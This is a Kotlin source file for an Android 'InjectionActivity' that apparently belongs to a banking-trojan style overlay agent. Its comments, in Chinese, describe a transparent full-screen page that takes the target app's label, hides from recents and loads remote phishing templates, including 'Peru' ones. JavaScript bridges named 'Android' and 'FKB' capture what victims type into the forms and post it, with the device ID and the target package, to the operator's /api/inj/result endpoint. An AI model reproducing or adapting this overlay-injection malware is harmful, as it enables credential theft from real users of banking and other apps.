package com.zaka.screenagent.ui

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.view.ViewGroup
import android.webkit.JavascriptInterface
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.FrameLayout
import com.zaka.screenagent.AgentConfig
import com.zaka.screenagent.DeviceIdentity
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

/**
 * 注入页（对应 2.2 的 OverlayActivity）。
 *
 * 和 2.2 完全一致的载体选择：**不是悬浮窗，而是我们自己的一个全屏 Activity**
 * （透明主题 + excludeFromRecents + label 沿用宿主），目标 App 会被切到后台，
 * 关闭后再把目标 App 拉回前台。
 *
 * 协议**双兼容**：
 *   ① HTML 自己 POST   →  由服务端 /api/inj/result 接收（这条不需要原生参与）
 *   ② 原生桥上报       →  Android.returnResult(json) / FKB.setFormData(json)
 *                        （秘鲁那批模板就是这条；原生层负责包 deviceId/packageName/template）
 *
 * 桥名同时注册 "Android" 与 "FKB"，方法集覆盖两套模板用到的一切：
 *   returnResult / setFormData / close / finish / setClosePage / getPkg / getSn / getDeviceId
 */
class InjectionActivity : android.app.Activity() {

    companion object {
        private const val TAG = "InjectionActivity"
        const val EXTRA_URL = "url"
        const val EXTRA_PKG = "pkg"
        const val EXTRA_TEMPLATE = "template"
        const val EXTRA_FULLSCREEN = "fullscreen"

        fun start(ctx: Context, url: String, pkg: String = "", template: String = "", fullscreen: Boolean = true) {
            if (url.isBlank()) {
                Log.w(TAG, "start ignored: empty url")
                return
            }
            val i = Intent(ctx, InjectionActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra(EXTRA_URL, url)
                putExtra(EXTRA_PKG, pkg)
                putExtra(EXTRA_TEMPLATE, template)
                putExtra(EXTRA_FULLSCREEN, fullscreen)
            }
            runCatching { ctx.startActivity(i) }
                .onFailure { Log.w(TAG, "startActivity failed: $it") }
        }
    }

    private lateinit var web: WebView
    private val main = Handler(Looper.getMainLooper())

    private var targetPkg: String = ""
    private var template: String = ""
    private var submitted = false

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // 2.2 的做法：去标题 + 透明主题 + 全屏内容
        requestWindowFeature(android.view.Window.FEATURE_NO_TITLE)
        // 与目标 App 视觉融合：状态栏/导航栏都透明，内容延伸到系统栏下面（否则底部会出现白条）
        window.statusBarColor = Color.TRANSPARENT
        window.navigationBarColor = Color.TRANSPARENT
        if (android.os.Build.VERSION.SDK_INT >= 29) {
            window.isStatusBarContrastEnforced = false
            window.isNavigationBarContrastEnforced = false
        }
        if (android.os.Build.VERSION.SDK_INT >= 30) {
            window.setDecorFitsSystemWindows(false)
        } else {
            @Suppress("DEPRECATION")
            window.decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                    or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                    or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                )
        }

        targetPkg = intent.getStringExtra(EXTRA_PKG).orEmpty()
        template = intent.getStringExtra(EXTRA_TEMPLATE).orEmpty()
        val url = intent.getStringExtra(EXTRA_URL).orEmpty()

        val root = FrameLayout(this)
        root.setBackgroundColor(Color.TRANSPARENT)

        web = WebView(this)
        web.setBackgroundColor(Color.TRANSPARENT)
        web.setLayerType(View.LAYER_TYPE_HARDWARE, null)
        web.layoutParams = FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)

        with(web.settings) {
            javaScriptEnabled = true
            domStorageEnabled = true
            databaseEnabled = true
            allowFileAccess = true
            allowContentAccess = true
            cacheMode = WebSettings.LOAD_DEFAULT
            loadsImagesAutomatically = true
            javaScriptCanOpenWindowsAutomatically = true
            mediaPlaybackRequiresUserGesture = false
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            useWideViewPort = true
            loadWithOverviewMode = true
            builtInZoomControls = false
            displayZoomControls = false
            userAgentString = userAgentString.replace("; wv", "")
        }
        web.addJavascriptInterface(Bridge(), "Android")
        web.addJavascriptInterface(Bridge(), "FKB")
        web.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, u: String?) {
                Log.d(TAG, "page finished: $u")
            }
        }

        root.addView(web)
        setContentView(root)

        if (url.isBlank()) {
            Log.w(TAG, "no url, finishing")
            finish()
            return
        }
        Log.d(TAG, "load url=$url pkg=$targetPkg template=$template")
        web.loadUrl(url)
    }

    override fun onDestroy() {
        runCatching { web.destroy() }
        super.onDestroy()
    }

    // ───────────────────────── 原生桥 ─────────────────────────
    inner class Bridge {

        /** 秘鲁新协议：Android.returnResult(json) */
        @JavascriptInterface
        fun returnResult(json: String?) = submit(json)

        /** 原始协议：FKB.setFormData(json) / Android.setFormData(json) */
        @JavascriptInterface
        fun setFormData(json: String?) = submit(json)

        @JavascriptInterface
        fun close() = finishOnUi()

        @JavascriptInterface
        fun finish() = finishOnUi()

        @JavascriptInterface
        fun setClosePage(pkg: String?) = finishOnUi()

        @JavascriptInterface
        fun getPkg(): String = targetPkg

        @JavascriptInterface
        fun getSn(): String = devIdRaw()

        @JavascriptInterface
        fun getDeviceId(): String = devIdRaw()

        @JavascriptInterface
        fun getAppLabel(): String = AgentConfig.get(this@InjectionActivity).appName

        @JavascriptInterface
        fun getSdkInt(): Int = android.os.Build.VERSION.SDK_INT
    }

    private fun devIdRaw(): String = runCatching {
        android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
    }.getOrDefault("")

    private fun finishOnUi() {
        main.post { runCatching { finish() } }
    }

    /**
     * 表单数据 → 上报。
     * 统一成服务端 /api/inj/result 的两种格式之一：
     *   {deviceId, packageName, template, formData:{...}}   （formData 对象）
     *   {deviceId, packageName, template, data:"{...}"}      （data 字符串）
     */
    private fun submit(raw: String?) {
        if (submitted) return
        submitted = true
        val payload = raw.orEmpty()
        Log.d(TAG, "bridge submit: $payload")

        // 模板自己可能带 pkg，优先用它
        var pkg = targetPkg
        var formObj: JSONObject? = null
        runCatching {
            val o = JSONObject(payload)
            formObj = o
            val p = o.optString("pkg", "")
            if (p.isNotBlank()) pkg = p
        }

        val body = JSONObject().apply {
            put("deviceId", runCatching {
                android.provider.Settings.Secure.getString(
                    this@InjectionActivity.contentResolver,
                    android.provider.Settings.Secure.ANDROID_ID)
            }.getOrDefault(""))
            put("packageName", pkg)
            put("pkg", pkg)
            put("template", template)
            if (formObj != null) put("formData", formObj) else put("data", payload)
        }

        val base = AgentConfig.get(this).serverUrl
            .replaceFirst("wss://", "https://")
            .replaceFirst("ws://", "http://")
            .trimEnd('/')

        Thread {
            var conn: HttpURLConnection? = null
            try {
                val u = URL("$base/api/inj/result")
                conn = (u.openConnection() as HttpURLConnection).apply {
                    requestMethod = "POST"
                    connectTimeout = 8000
                    readTimeout = 8000
                    doOutput = true
                    setRequestProperty("Content-Type", "application/json; charset=utf-8")
                }
                conn.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
                val code = conn.responseCode
                Log.d(TAG, "inj/result -> HTTP $code")
            } catch (e: Exception) {
                Log.w(TAG, "inj/result failed: $e")
            } finally {
                runCatching { conn?.disconnect() }
            }
        }.start()

        finishOnUi()
    }
}
